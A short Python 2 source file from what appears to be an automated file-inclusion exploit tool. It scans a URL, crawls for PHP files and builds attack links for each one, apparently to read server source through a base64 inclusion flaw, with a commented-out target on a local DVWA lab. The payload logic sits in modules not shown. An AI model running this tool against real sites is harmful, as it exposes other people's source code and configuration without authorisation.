import sys
import string
sys.path.append('../')
from config import *
sys.path.append('../lib/attack/')
from exportfile import *
sys.path.append('../lib/crawler/')
from  gethref import *
from  getdata import *
from phpaccept import *
from urlparse import urlparse
sys.path.append('../lib/attack/')
from makelinkattack import *
sys.path.append('../lib/attack/')
from makelinkquery import *
from xacdinhfilename import *
sys.path.append('../lib/scan/')
from scan import *
def attackController(url):
    if scan(url)!="base64scan":
        return 0
    print '[INFO]: Preparing automatic exploit to target '+url+"\n"
    goc =  makelinkattack(url)
    exportfile(goc)
    o = urlparse(url)
    linkquery = makelinkquery(url)
    print '[INFO]: Determining the query URL is "'+linkquery+'"\n'
    HOSTNAME = o.hostname
    
    gethref(getdata(url))
    print '[INFO]: Get php files as much as possible, FOUND: '
    print PATH
    print "\n"
    for path in PATH:
        
        full = linkquery +path
        #print full
        
        full = makelinkattack(full)
        #print full
        #print url
        exportfile(full)
      
#attackController("http://localhost/dvwa/vulnerabilities/fi/?page=include.php")
        
 
    
